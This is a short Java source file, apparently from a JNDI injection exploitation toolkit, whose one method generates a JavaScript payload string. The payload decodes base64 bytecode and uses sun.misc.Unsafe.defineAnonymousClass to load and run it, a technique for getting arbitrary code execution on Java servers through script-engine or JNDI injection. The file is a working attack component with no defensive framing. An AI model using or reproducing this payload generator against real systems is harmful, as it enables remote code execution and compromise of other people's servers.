package map.jndi.util;

import java.util.Base64;

public class PayloadUtil {
    public static String getJavaScriptPayload(byte[] byteCode) {
        String code = "var s = '" + Base64.getEncoder().encodeToString(byteCode) + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
        return code;
    }
}
